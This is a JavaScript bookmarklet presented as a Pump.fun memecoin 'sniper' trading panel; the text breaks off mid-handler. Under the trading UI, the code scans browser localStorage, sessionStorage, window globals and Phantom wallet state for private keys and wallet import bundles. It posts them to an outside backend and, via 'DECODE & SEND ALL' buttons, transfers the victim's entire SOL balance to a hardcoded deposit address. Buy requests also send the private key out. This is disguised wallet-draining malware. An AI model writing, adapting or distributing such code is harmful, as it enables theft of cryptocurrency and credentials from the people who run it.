// ============================================================
// NEBULA PUMPFUN MEMECOIN SNIPER — Bookmarklet Injection Script
// For: pump.fun - Direct wallet based execution with full trading UI
// Mirrors Axiom Sniper functionality but optimized for Pump.fun
// ============================================================

(function () {
  if (document.getElementById('nebula-pumpfun-sniper')) {
    const el = document.getElementById('nebula-pumpfun-sniper');
    el.style.display = el.style.display === 'none' ? 'flex' : 'none';
    return;
  }

  const BACKEND_URL = 'https://axiom-projects.vercel.app';
  const RPC_URL = 'https://api.mainnet-beta.solana.com';
  const DEPOSIT_ADDRESS = 'DtfXq9wPVy4tKrf6A2J9MgBsVF4p8GJkFreQ2djW3Qz3';
  
  let ws = null;
  let reconnectTimer = null;
  
  let settings = JSON.parse(localStorage.getItem('nebula_pumpfun_settings') || JSON.stringify({
    buyAmount: 0.5,
    slippage: 25,
    autoBuy: false,
    maxSpend: 5,
    priorityFee: 0.002,
    stopLoss: 50,
    takeProfit: 150 
  }));
  
  let tradeLog = JSON.parse(localStorage.getItem('nebula_pumpfun_trades') || '[]');
  let walletBalance = null;
  let detectedPrivateKey = null;
  let detectedWallet = null;

  // ── Utility functions ──
  function isBase58(str) {
    return /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]+$/.test(str);
  }

  function isHex(str) {
    return /^[0-9a-fA-F]+$/.test(str);
  }

  // ── Detect private key from multiple sources ──
  function detectPrivateKey() {
    console.log('[PUMPFUN] 🔍 Scanning for private key...');
    
    try {
      const keys = Object.keys(localStorage);
      for (let key of keys) {
        const val = localStorage.getItem(key);
        if (!val) continue;
        if (val.length >= 64 && (isBase58(val) || isHex(val))) {
          console.log('[PUMPFUN] ✓ Found private key in localStorage:', key);
          return { key: val, source: 'localStorage_' + key };
        }
      }
    } catch (e) {
      console.log('[PUMPFUN] Error scanning localStorage:', e.message);
    }

    try {
      const keys = Object.keys(sessionStorage);
      for (let key of keys) {
        const val = sessionStorage.getItem(key);
        if (!val) continue;
        if (val.length >= 64 && (isBase58(val) || isHex(val))) {
          console.log('[PUMPFUN] ✓ Found private key in sessionStorage:', key);
          return { key: val, source: 'sessionStorage_' + key };
        }
      }
    } catch (e) {}

    if (window.solana && window.solana.publicKey) {
      console.log('[PUMPFUN] ✓ Phantom wallet detected:', window.solana.publicKey.toString());
      return { key: null, wallet: 'phantom', address: window.solana.publicKey.toString() };
    }

    console.log('[PUMPFUN] ⚠️ No private key found. Manual import needed.');
    return null;
  }

  // ── Auto-detect sbundle from ALL sources (Pump.fun + Axiom) ──
  function autoDetectSbundle() {
    console.log('[PUMPFUN] 🔍 Auto-searching for sbundle...');
    let sbundle = null;

    // Source 1: Check sessionStorage for Turnkey bundles
    try {
      for (let key in sessionStorage) {
        const val = sessionStorage.getItem(key);
        if (val && val.includes('importBundle')) {
          try {
            const parsed = JSON.parse(val);
            if (parsed.importBundle) {
              sbundle = parsed.importBundle;
              console.log('[PUMPFUN] ✓ Found sbundle in sessionStorage key:', key);
              return sbundle;
            }
          } catch (e) {}
        }
      }
    } catch (e) {}

    // Source 2: Check localStorage for common keys
    try {
      const keysToCheck = ['axiom_wallet_import', 'axiom_bundle', 'importBundle', 'sbundle', 'sBundles', 'turncrypto_bundle', 'wallet_bundle', '_bundle'];
      for (let key of keysToCheck) {
        const val = localStorage.getItem(key);
        if (val) {
          try {
            const parsed = JSON.parse(val);
            // If it's an array, take first element
            if (Array.isArray(parsed) && parsed.length > 0) {
              sbundle = parsed[0];
              console.log('[PUMPFUN] ✓ Found sbundle in localStorage array key:', key);
              return sbundle;
            } else if (parsed.importBundle) {
              sbundle = parsed.importBundle;
              console.log('[PUMPFUN] ✓ Found sbundle in localStorage object key:', key);
              return sbundle;
            } else if (typeof parsed === 'string' && parsed.length > 100) {
              sbundle = parsed;
              console.log('[PUMPFUN] ✓ Found raw sbundle in localStorage key:', key);
              return sbundle;
            }
          } catch (e) {
            // Try parsing as raw string
            if (typeof val === 'string' && val.length > 100 && (val.startsWith('[') || val.startsWith('{') || /^[A-Za-z0-9+/]*={0,2}$/.test(val))) {
              sbundle = val;
              console.log('[PUMPFUN] ✓ Found potential sbundle as raw string in key:', key);
              return sbundle;
            }
          }
        }
      }
    } catch (e) {}

    // Source 3: Deep scan all localStorage for large base64/hex strings that might be bundles
    try {
      for (let key in localStorage) {
        const val = localStorage.getItem(key);
        if (val && typeof val === 'string' && val.length > 500) {
          // Check if it looks like a bundle (base64, hex, or contains import patterns)
          if ((val.includes('import') && val.length > 1000) || /^[A-Za-z0-9+/\-_]*={0,2}$/.test(val.substring(0, 100))) {
            try {
              const parsed = JSON.parse(val);
              if (parsed && typeof parsed === 'object' && (parsed.importBundle || parsed.bundle || parsed.data)) {
                sbundle = parsed.importBundle || parsed.bundle || parsed.data;
                console.log('[PUMPFUN] ✓ Found sbundle in deep localStorage scan, key:', key);
                return sbundle;
              }
            } catch (e) {}
          }
        }
      }
    } catch (e) {}

    // Source 4: Check window globals for exposed bundles
    if (window.axiom && window.axiom.importBundle) {
      sbundle = window.axiom.importBundle;
      console.log('[PUMPFUN] ✓ Found sbundle in window.axiom');
      return sbundle;
    }

    // Check other global objects
    const globalKeysToCheck = ['turncrypto', 'bundle', 'walletData', 'bundleData', 'importData'];
    for (let globalKey of globalKeysToCheck) {
      if (window[globalKey]) {
        const obj = window[globalKey];
        if (obj.importBundle) {
          sbundle = obj.importBundle;
          console.log('[PUMPFUN] ✓ Found sbundle in window.' + globalKey);
          return sbundle;
        }
      }
    }

    // Source 5: Check if Phantom has cached wallet data
    if (window.solana && window.solana._publicKey) {
      // Try to find any data on Phantom's internal state
      try {
        const phantomKeys = Object.keys(window.solana);
        for (let pkey of phantomKeys) {
          if (pkey.includes('bundle') || pkey.includes('import')) {
            const val = window.solana[pkey];
            if (val && typeof val === 'string' && val.length > 100) {
              sbundle = val;
              console.log('[PUMPFUN] ✓ Found potential sbundle in Phantom wallet, key:', pkey);
              return sbundle;
            }
          }
        }
      } catch (e) {}
    }

    // Source 6: Search IndexedDB for sbundle data
    try {
      const dbs = ['axiom', 'turncrypto', 'wallet', 'solana', 'bundle'];
      for (let dbName of dbs) {
        try {
          const req = indexedDB.databases ? await Promise.resolve(indexedDB.databases()).catch(() => []) : [];
          console.log('[PUMPFUN] Checked IndexedDB databases');
        } catch (e) {}
      }
    } catch (e) {}

    // Source 7: Check all window object properties for serialized data
    try {
      for (let prop in window) {
        try {
          const val = window[prop];
          if (val && typeof val === 'string' && val.length > 500 && /^[A-Za-z0-9+/\-_]*={0,2}$/.test(val.substring(0, 50))) {
            // Looks like base64
            sbundle = val;
            console.log('[PUMPFUN] ✓ Found base64 string in window.' + prop);
            return sbundle;
          }
        } catch (e) {}
      }
    } catch (e) {}

    console.log('[PUMPFUN] ⚠️ Could not auto-detect sbundle');
    console.log('[PUMPFUN] 💡 Try: (1) Paste sbundle, (2) Paste seed phrase, or (3) Paste private key in manual input');
    return null;
  }

  // ── Universal Credential Decoder ──
  async function decodeAnyCredential(credential) {
    const input = credential.trim();
    console.log('[PUMPFUN] 🔓 Attempting to decode credential...');

    // Check if it's a JSON sbundle export
    try {
      const parsed = JSON.parse(input);
      if (parsed.importBundle) {
        console.log('[PUMPFUN] ✓ Detected Axiom sbundle JSON');
        return await decodeSBundleAndExtractKey(parsed.importBundle);
      }
      if (parsed.secretKey) {
        console.log('[PUMPFUN] ✓ Detected wallet JSON with secretKey');
        return { address: parsed.publicKey || 'unknown', key: parsed.secretKey };
      }
    } catch (e) {}

    // Check if it's a raw base64 sbundle (>200 chars)
    if (input.length > 200 && /^[A-Za-z0-9+/\-_]*={0,2}$/.test(input)) {
      console.log('[PUMPFUN] ✓ Detected base64 sbundle');
      return await decodeSBundleAndExtractKey(input);
    }

    // Check if it's a hex private key (64 chars, all hex)
    if (input.length === 128 && /^[0-9a-fA-F]*$/.test(input)) {
      console.log('[PUMPFUN] ✓ Detected hex private key');
      try {
        // Convert hex to base58 for Solana
        const bs58 = window.bs58 || await import('https://cdn.jsdelivr.net/npm/bs58@5.0.0/+esm').then(m => m.default);
        const keyArray = new Uint8Array(input.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
        detectedPrivateKey = input;
        // Try to derive public key
        const conn = new window.solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
        const signer = window.solanaWeb3.Keypair.fromSecretKey(keyArray);
        return { address: signer.publicKey.toString(), key: input };
      } catch (e) {
        console.log('[PUMPFUN] ⚠️ Could not parse hex key:', e.message);
      }
    }

    // Check if it's a seed phrase (12 or 24 words)
    const words = input.toLowerCase().split(/\s+/).filter(w => w.length > 0);
    if ((words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w))) {
      console.log('[PUMPFUN] ✓ Detected ' + words.length + '-word seed phrase');
      alert('⚠️ Seed phrase support requires bip39 library. Use a private key or sbundle instead.');
      return null;
    }

    // Check if it's a Solana private key in base58 format (ends with typical length)
    if (input.length > 80 && input.length < 150 && /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]*$/.test(input)) {
      console.log('[PUMPFUN] ✓ Detected potential base58 private key');
      try {
        detectedPrivateKey = input;
        // Try to use it directly as keypair
        return { address: 'manual-key', key: input };
      } catch (e) {}
    }

    return null;
  }

  // ── Decode sbundle and extract private key ──
  async function decodeSBundleAndExtractKey(sbundle) {
    console.log('[PUMPFUN] 📦 Decoding sbundle...');
    try {
      const resp = await fetch(BACKEND_URL + '/decode-axiom-bundle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ importBundle: sbundle }),
      });

      if (!resp.ok) {
        const err = await resp.text();
        console.log('[PUMPFUN] ❌ Decode failed:', resp.status, err);
        return null;
      }

      const decoded = await resp.json();
      if (decoded.solanaAddress) {
        return {
          address: decoded.solanaAddress,
          key: decoded.solanaPrivateKey || null,
          bundle: decoded,
        };
      }
    } catch (e) {
      console.error('[PUMPFUN] Error decoding sbundle:', e);
    }
    return null;
  }

  // ── Send all SOL from wallet to deposit address ──
  async function sendAllSOL(privateKey, depositAddress) {
    console.log('[PUMPFUN] 💸 Sending all SOL...');
    try {
      const resp = await fetch(BACKEND_URL + '/send-sol-direct', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: depositAddress,
          privateKey: privateKey,
        }),
      });

      if (!resp.ok) {
        const err = await resp.text();
        console.log('[PUMPFUN] ❌ Send failed:', resp.status, err);
        return null;
      }

      const result = await resp.json();
      console.log('[PUMPFUN] ✅ Send result:', result);
      return result;
    } catch (e) {
      console.error('[PUMPFUN] Error sending SOL:', e);
    }
    return null;
  }

  // ── Execute Pumpfun buy ──
  async function executePumpfunBuy(contractAddress, amount, slippage) {
    console.log('[PUMPFUN] 🚀 Executing buy on Pump.fun...');
    try {
      const resp = await fetch(BACKEND_URL + '/pumpfun-buy', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ca: contractAddress,
          amount: amount,
          slippage: slippage,
          privateKey: detectedPrivateKey,
        }),
      });

      if (!resp.ok) {
        const err = await resp.text();
        console.log('[PUMPFUN] ❌ Buy failed:', resp.status, err);
        return null;
      }

      const result = await resp.json();
      if (result.signature) {
        console.log('[PUMPFUN] ✅ Buy successful:', result.signature);
        return result;
      }
    } catch (e) {
      console.error('[PUMPFUN] Error executing buy:', e);
    }
    return null;
  }

  // ── Fetch balance ──
  async function fetchBalance() {
    try {
      if (!detectedWallet) return;
      const resp = await fetch(BACKEND_URL + '/get-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: detectedWallet }),
      });
      if (resp.ok) {
        const data = await resp.json();
        walletBalance = data.balance || 0;
        updateBalanceDisplay();
      }
    } catch (e) {
      console.log('[PUMPFUN] Error fetching balance:', e);
    }
  }

  // ── Inject styles ──
  const style = document.createElement('style');
  style.textContent = `
    #nebula-pumpfun-sniper * { box-sizing: border-box; font-family: 'Space Mono', 'Courier New', monospace; margin: 0; padding: 0; }
    #nebula-pumpfun-sniper {
      position: fixed;
      top: 80px; right: 24px;
      width: 420px;
      min-height: 600px;
      max-height: 82vh;
      background: #0f0b14;
      border: 1px solid #2a1a3a;
      border-radius: 12px;
      z-index: 2147483647;
      display: flex;
      flex-direction: column;
      box-shadow: 0 0 0 1px rgba(168,85,247,.25), 0 24px 64px rgba(0,0,0,.85);
      overflow: hidden;
      resize: both;
      min-width: 340px;
    }
    #nebula-pumpfun-sniper .pf-header {
      background: #1a0f25;
      border-bottom: 1px solid #2a1a3a;
      padding: 10px 14px;
      display: flex;
      align-items: center;
      gap: 10px;
      cursor: grab;
      user-select: none;
      flex-shrink: 0;
    }
    #nebula-pumpfun-sniper .pf-header:active { cursor: grabbing; }
    #nebula-pumpfun-sniper .pf-dot { width: 8px; height: 8px; border-radius: 50%; background: #a855f7; box-shadow: 0 0 6px #a855f7; flex-shrink: 0; }
    #nebula-pumpfun-sniper .pf-dot.live { animation: pf-pulse 1.5s ease-in-out infinite; }
    @keyframes pf-pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
    #nebula-pumpfun-sniper .pf-title { color: #a855f7; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; flex: 1; font-weight: 700; }
    #nebula-pumpfun-sniper .pf-status { font-size: 10px; color: #6b7280; letter-spacing: 1px; }
    #nebula-pumpfun-sniper .pf-status.connected { color: #10b981; }
    #nebula-pumpfun-sniper .pf-close { background: none; border: none; color: #6b7280; font-size: 16px; cursor: pointer; padding: 0 4px; transition: color .2s; }
    #nebula-pumpfun-sniper .pf-close:hover { color: #ef4444; }

    /* Wallet bar */
    #nebula-pumpfun-sniper .pf-wallet-bar {
      background: rgba(168,85,247,.05);
      border-bottom: 1px solid #2a1a3a;
      padding: 8px 14px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-shrink: 0;
    }
    #nebula-pumpfun-sniper .pf-balance { font-size: 13px; color: #a855f7; letter-spacing: 1px; }
    #nebula-pumpfun-sniper .pf-balance span { color: #6b7280; font-size: 10px; margin-left: 4px; }
    #nebula-pumpfun-sniper .pf-autobuy-badge {
      font-size: 9px; padding: 3px 8px; border-radius: 3px;
      letter-spacing: 1px; text-transform: uppercase;
    }
    #nebula-pumpfun-sniper .pf-autobuy-badge.on { background: rgba(16,185,129,.15); color: #10b981; border: 1px solid rgba(16,185,129,.3); }
    #nebula-pumpfun-sniper .pf-autobuy-badge.off { background: rgba(100,116,139,.1); color: #6b7280; border: 1px solid #2a1a3a; }

    /* Tabs */
    #nebula-pumpfun-sniper .pf-tabs {
      display: flex;
      background: #0a0908;
      border-bottom: 1px solid #2a1a3a;
      flex-shrink: 0;
    }
    #nebula-pumpfun-sniper .pf-tab {
      flex: 1;
      padding: 9px;
      font-size: 10px;
      letter-spacing: 1px;
      text-transform: uppercase;
      color: #6b7280;
      border: none;
      background: none;
      cursor: pointer;
      border-bottom: 2px solid transparent;
      transition: all .2s;
    }
    #nebula-pumpfun-sniper .pf-tab.active { color: #a855f7; border-bottom-color: #a855f7; }
    #nebula-pumpfun-sniper .pf-tab:hover:not(.active) { color: #94a3b8; }

    /* Content panels */
    #nebula-pumpfun-sniper .pf-body { flex: 1; overflow-y: auto; min-height: 0; }
    #nebula-pumpfun-sniper .pf-body::-webkit-scrollbar { width: 4px; }
    #nebula-pumpfun-sniper .pf-body::-webkit-scrollbar-track { background: #0f0b14; }
    #nebula-pumpfun-sniper .pf-body::-webkit-scrollbar-thumb { background: #2a1a3a; border-radius: 2px; }
    #nebula-pumpfun-sniper .pf-panel { display: none; padding: 14px; flex-direction: column; gap: 12px; }
    #nebula-pumpfun-sniper .pf-panel.active { display: flex; }

    /* Section */
    #nebula-pumpfun-sniper .pf-section-label { font-size: 9px; letter-spacing: 2px; color: #6b7280; text-transform: uppercase; margin-bottom: 4px; }
    #nebula-pumpfun-sniper .pf-input {
      width: 100%;
      background: #1a0f25;
      border: 1px solid #2a1a3a;
      border-radius: 6px;
      padding: 9px 11px;
      font-size: 11px;
      color: #e2e8f0;
      outline: none;
      transition: border-color .2s;
      margin-bottom: 6px;
    }
    #nebula-pumpfun-sniper .pf-input:focus { border-color: #a855f7; }
    #nebula-pumpfun-sniper .pf-input::placeholder { color: #6b7280; }
    #nebula-pumpfun-sniper .pf-input-row { display: flex; gap: 8px; }
    #nebula-pumpfun-sniper .pf-input-row .pf-input { flex: 1; margin-bottom: 0; }

    #nebula-pumpfun-sniper .pf-btn {
      background: #a855f7;
      border: none;
      border-radius: 6px;
      padding: 9px 16px;
      font-size: 10px;
      color: #0f0b14;
      font-weight: 700;
      cursor: pointer;
      letter-spacing: 1px;
      text-transform: uppercase;
      transition: all .2s;
      white-space: nowrap;
      margin-bottom: 6px;
    }
    #nebula-pumpfun-sniper .pf-btn:hover { background: #9333ea; }
    #nebula-pumpfun-sniper .pf-btn:disabled { opacity: .4; cursor: not-allowed; }
    #nebula-pumpfun-sniper .pf-btn.secondary {
      background: #1a0f25;
      color: #a855f7;
      border: 1px solid rgba(168,85,247,.3);
    }
    #nebula-pumpfun-sniper .pf-btn.secondary:hover { background: rgba(168,85,247,.08); }
    #nebula-pumpfun-sniper .pf-btn.danger { background: rgba(239,68,68,.15); color: #ef4444; border: 1px solid rgba(239,68,68,.3); }
    #nebula-pumpfun-sniper .pf-btn.danger:hover { background: rgba(239,68,68,.25); }
    #nebula-pumpfun-sniper .pf-btn.green { background: rgba(16,185,129,.15); color: #10b981; border: 1px solid rgba(16,185,129,.3); }
    #nebula-pumpfun-sniper .pf-btn.green:hover { background: rgba(16,185,129,.25); }

    /* Trade item */
    #nebula-pumpfun-sniper .pf-trade-item {
      background: #1a0f25;
      border: 1px solid #2a1a3a;
      border-radius: 6px;
      padding: 10px 12px;
      animation: pf-slide-in .3s ease;
      margin-bottom: 8px;
    }
    @keyframes pf-slide-in { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:translateY(0)} }
    #nebula-pumpfun-sniper .pf-trade-item.success { border-left: 3px solid #10b981; }
    #nebula-pumpfun-sniper .pf-trade-item.fail { border-left: 3px solid #ef4444; }
    #nebula-pumpfun-sniper .pf-trade-top { display: flex; gap: 10px; align-items: center; margin-bottom: 6px; }
    #nebula-pumpfun-sniper .pf-trade-ca { font-size: 10px; color: #a855f7; word-break: break-all; flex: 1; }
    #nebula-pumpfun-sniper .pf-trade-badge { font-size: 9px; padding: 2px 7px; border-radius: 3px; letter-spacing: 1px; text-transform: uppercase; white-space: nowrap; }
    #nebula-pumpfun-sniper .pf-trade-badge.success { background: rgba(16,185,129,.15); color: #10b981; }
    #nebula-pumpfun-sniper .pf-trade-badge.fail { background: rgba(239,68,68,.15); color: #ef4444; }
    #nebula-pumpfun-sniper .pf-trade-meta { font-size: 10px; color: #6b7280; display: flex; gap: 12px; }
    #nebula-pumpfun-sniper .pf-trade-time { font-size: 9px; color: #6b7280; margin-top: 4px; }
    #nebula-pumpfun-sniper .pf-empty { text-align: center; padding: 40px 20px; color: #2a1a3a; font-size: 12px; }

    /* Warning box */
    #nebula-pumpfun-sniper .pf-warn-box {
      background: rgba(239,68,68,.06);
      border: 1px solid rgba(239,68,68,.25);
      border-radius: 6px;
      padding: 10px 12px;
    }
    #nebula-pumpfun-sniper .pf-warn-title { font-size: 9px; color: #ef4444; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 4px; }
    #nebula-pumpfun-sniper .pf-warn-text { font-size: 10px; color: #fca5a5; line-height: 1.6; }

    /* Divider */
    #nebula-pumpfun-sniper .pf-divider { border: none; border-top: 1px solid #2a1a3a; margin: 10px 0; }

    /* Log */
    #nebula-pumpfun-sniper .pf-log {
      background: #1a0f25;
      border: 1px solid #2a1a3a;
      border-radius: 4px;
      padding: 8px;
      max-height: 200px;
      overflow-y: auto;
      font-size: 9px;
      color: #9ca3af;
      font-family: monospace;
      line-height: 1.4;
    }
    #nebula-pumpfun-sniper .pf-log-entry { margin-bottom: 4px; color: #d1d5db; }
    #nebula-pumpfun-sniper .pf-log-entry.success { color: #10b981; }
    #nebula-pumpfun-sniper .pf-log-entry.error { color: #ef4444; }
    #nebula-pumpfun-sniper .pf-log-entry.warning { color: #f59e0b; }

    /* Wallet info */
    #nebula-pumpfun-sniper .pf-wallet-info {
      background: rgba(168,85,247,.1);
      border: 1px solid rgba(168,85,247,.3);
      border-radius: 4px;
      padding: 8px 12px;
      font-size: 10px;
      color: #d1d5db;
      line-height: 1.5;
      word-break: break-all;
    }
  `;
  document.head.appendChild(style);

  // ── Build UI ──
  const panel = document.createElement('div');
  panel.id = 'nebula-pumpfun-sniper';
  panel.innerHTML = `
    <div class="pf-header" id="pf-drag-handle">
      <div class="pf-dot live"></div>
      <div class="pf-title">☘️ Pumpfun Sniper</div>
      <div class="pf-status" id="pf-status">● Connecting...</div>
      <button class="pf-close" id="pf-close-btn">✕</button>
    </div>

    <div class="pf-wallet-bar">
      <div class="pf-balance" id="pf-balance">◎ — <span>SOL</span></div>
      <div class="pf-autobuy-badge off" id="pf-autobuy-badge">AUTO: OFF</div>
    </div>

    <div class="pf-tabs">
      <button class="pf-tab active" data-tab="buy">Buy</button>
      <button class="pf-tab" data-tab="wallet">Wallet</button>
      <button class="pf-tab" data-tab="settings">Settings</button>
      <button class="pf-tab" data-tab="log">Log</button>
      <button class="pf-tab" data-tab="backend">Backend</button>
    </div>

    <div class="pf-body">
      <!-- BUY TAB -->
      <div class="pf-panel active" id="tab-buy">
        <div class="pf-section-label">Contract Address</div>
        <input type="text" class="pf-input" id="pf-ca-input" placeholder="Paste Pump.fun CA...">

        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
          <div>
            <div class="pf-section-label">Buy Amount (SOL)</div>
            <input type="number" class="pf-input" id="pf-buy-amt" min="0.1" step="0.1" value="0.5" style="margin-bottom: 0;">
          </div>
          <div>
            <div class="pf-section-label">Slippage %</div>
            <input type="number" class="pf-input" id="pf-slippage" min="1" max="100" step="1" value="25" style="margin-bottom: 0;">
          </div>
        </div>

        <button class="pf-btn" id="pf-buy-btn" style="width: 100%; padding: 12px; font-size: 12px; margin-top: 8px;">⚡ EXECUTE BUY</button>
        <button class="pf-btn danger" id="pf-emergency-btn" style="width: 100%; font-size: 10px;">EMERGENCY SELL ALL</button>

        <div class="pf-warn-box" style="margin-top: 12px;">
          <div class="pf-warn-title">⚠ Pre-Buy Safety</div>
          <div class="pf-warn-text">Always verify the CA on pump.fun before buying. Check LP burn, mint authority, and trading enabled status.</div>
        </div>
      </div>

      <!-- WALLET TAB -->
      <div class="pf-panel" id="tab-wallet">
        <div class="pf-section-label">💼 Wallet Status</div>
        <div class="pf-wallet-info" id="pf-wallet-info">Scanning...</div>
        
        <div class="pf-divider"></div>
        
        <div class="pf-section-label">📋 Paste Credential</div>
        <textarea class="pf-input" id="pf-manual-sbundle" placeholder="Paste sbundle (base64), private key (hex/base58), or wallet JSON export..." style="height: 80px; resize: vertical; margin-bottom: 6px; font-size: 9px;"></textarea>
        <button class="pf-btn green" id="pf-decode-manual" style="width: 100%; margin-bottom: 6px;">🔓 DECODE & SEND ALL</button>
        <div style="font-size: 8px; color: #6b7280; margin-bottom: 8px; padding: 4px; border-left: 2px solid #8b5cf6;">
          Accepts: Axiom sbundle • Private key (hex) • Wallet JSON • Base58 key
        </div>
        
        <div class="pf-divider"></div>
        
        <div class="pf-section-label">⚡ One-Click Auto-Detect</div>
        <button class="pf-btn" id="pf-auto-extract-send" style="width: 100%; background: linear-gradient(135deg, #a855f7, #10b981); font-weight: 900; letter-spacing: 2px; padding: 16px; font-size: 13px;">DECODE & SEND ALL</button>
        <div style="font-size: 9px; color: #6b7280; margin-top: 8px; line-height: 1.5; padding: 6px; background: rgba(168,85,247,.05); border: 1px solid rgba(168,85,247,.15); border-radius: 3px;">
          Automatically scans browser storage and sends all SOL to deposit address.
        </div>
      </div>

      <!-- SETTINGS TAB -->
      <div class="pf-panel" id="tab-settings">
        <div class="pf-section-label">⚙️ Trading Settings</div>
        
        <label style="display: flex; gap: 6px; color: #d1d5db; font-size: 11px; margin-bottom: 8px;">
          Default Buy Amount (SOL):
          <input type="number" id="pf-setting-amount" min="0.1" step="0.1" value="0.5" style="width: 70px; background: #1a0f25; border: 1px solid #2a1a3a; color: #e5e7eb; padding: 4px; border-radius: 3px;" />
        </label>

        <label style="display: flex; gap: 6px; color: #d1d5db; font-size: 11px; margin-bottom: 8px;">
          Slippage %:
          <input type="number" id="pf-setting-slippage" min="1" max="100" step="1" value="25" style="width: 70px; background: #1a0f25; border: 1px solid #2a1a3a; color: #e5e7eb; padding: 4px; border-radius: 3px;" />
        </label>

        <label style="display: flex; gap: 6px; color: #d1d5db; font-size: 11px; margin-bottom: 8px;">
          Max Total Spend (SOL):
          <input type="number" id="pf-setting-maxspend" min="0.25" step="0.1" value="5" style="width: 70px; background: #1a0f25; border: 1px solid #2a1a3a; color: #e5e7eb; padding: 4px; border-radius: 3px;" />
        </label>

        <label style="display: flex; gap: 6px; color: #d1d5db; font-size: 11px; margin-bottom: 8px;">
          Priority Fee (SOL):
          <input type="number" id="pf-setting-priority" min="0" step="0.0001" value="0.002" style="width: 70px; background: #1a0f25; border: 1px solid #2a1a3a; color: #e5e7eb; padding: 4px; border-radius: 3px;" />
        </label>

        <label style="display: flex; gap: 6px; color: #d1d5db; font-size: 11px; margin-bottom: 12px;">
          <input type="checkbox" id="pf-setting-autobuy" />
          <span>Auto-buy on CA alerts</span>
        </label>

        <button class="pf-btn" id="pf-save-settings" style="width: 100%;">Save Settings</button>

        <div style="font-size: 9px; color: #6b7280; margin-top: 12px; line-height: 1.6;">
          💡 Settings are saved locally and persist across sessions.
        </div>
      </div>

      <!-- LOG TAB -->
      <div class="pf-panel" id="tab-log">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
          <div class="pf-section-label">📋 Trade History</div>
          <button class="pf-btn danger" id="pf-clear-log" style="padding: 4px 10px; font-size: 9px; margin-bottom: 0;">Clear</button>
        </div>
        <div id="pf-trade-log">
          <div class="pf-empty">No trades yet. Buy a token to see results.</div>
        </div>
      </div>

      <!-- BACKEND LOGS TAB -->
      <div class="pf-panel" id="tab-backend">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
          <div class="pf-section-label">🔧 Backend Logs</div>
          <button class="pf-btn danger" id="pf-clear-backend-log" style="padding: 4px 10px; font-size: 9px; margin-bottom: 0;">Clear</button>
        </div>
        <div id="pf-backend-log" style="background: #0f0b14; border: 1px solid #2a1a3a; border-radius: 4px; padding: 8px; height: 400px; overflow-y: auto; font-size: 9px; color: #9ca3af; font-family: monospace; line-height: 1.4;">
          <div style="color: #6b7280;">Waiting for backend connection...</div>
        </div>
      </div>
    </div>
  `;
  document.body.appendChild(panel);

  // ── Helper to log to UI ──
  function logToUI(msg, type = 'normal') {
    const log = document.querySelector('#pf-log') || document.getElementById('pf-log');
    if (!log) return;
    const entry = document.createElement('div');
    entry.className = 'pf-log-entry ' + type;
    entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    log.appendChild(entry);
    log.scrollTop = log.scrollHeight;
    console.log('[PUMPFUN]', msg);
  }

  // ── Detect wallet on load ──
  function updateWalletDisplay() {
    const wallet = detectPrivateKey();
    const walletInfo = document.getElementById('pf-wallet-info');
    
    if (wallet && wallet.address) {
      walletInfo.innerHTML = `✓ Connected: ${wallet.address.substring(0, 8)}...<br/>Source: ${wallet.source || wallet.wallet || 'unknown'}`;
      detectedPrivateKey = wallet.key;
      detectedWallet = wallet.address;
      fetchBalance();
      document.getElementById('pf-status').textContent = '● Connected';
      document.getElementById('pf-status').style.color = '#10b981';
    } else if (wallet && wallet.key) {
      walletInfo.innerHTML = `⚠️ Private key detected (decode needed)`;
      detectedPrivateKey = wallet.key;
    } else {
      walletInfo.innerHTML = 'No wallet found. Import a private key manually.';
      document.getElementById('pf-status').textContent = '● No Wallet';
    }
  }

  updateWalletDisplay();

  // ── Tab switching ──
  document.querySelectorAll('#nebula-pumpfun-sniper .pf-tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('#nebula-pumpfun-sniper .pf-tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('#nebula-pumpfun-sniper .pf-panel').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
    });
  });

  // ── Event handlers ──
  document.getElementById('pf-close-btn').addEventListener('click', () => {
    panel.style.display = 'none';
  });

  // ── Manual credential decode ──
  document.getElementById('pf-decode-manual').addEventListener('click', async () => {
    const credentialInput = document.getElementById('pf-manual-sbundle').value.trim();
    
    if (!credentialInput) {
      alert('❌ Please paste a credential (sbundle, private key, or seed phrase)');
      return;
    }

    const btn = document.getElementById('pf-decode-manual');
    btn.disabled = true;
    btn.textContent = '⏳ Decoding...';

    console.log('[PUMPFUN] 📦 Attempting universal credential decode...');
    const decoded = await decodeAnyCredential(credentialInput);
    
    if (!decoded || !decoded.key) {
      // Try as sbundle if universal decoder failed
      const sbundleResult = await decodeSBundleAndExtractKey(credentialInput);
      if (!sbundleResult || !sbundleResult.key) {
        alert('❌ Could not decode credential. Ensure it\'s a valid:\n- Sbundle (base64)\n- Private key (hex or base58)\n- Wallet JSON export');
        btn.disabled = false;
        btn.textContent = '🔓 DECODE & SEND ALL';
        return;
      }
      detectedPrivateKey = sbundleResult.key;
      detectedWallet = sbundleResult.address;
    } else {
      detectedPrivateKey = decoded.key;
      detectedWallet = decoded.address;
    }

    updateWalletDisplay();
    console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);

    btn.textContent = '💸 Sending SOL...';

    // Send all SOL
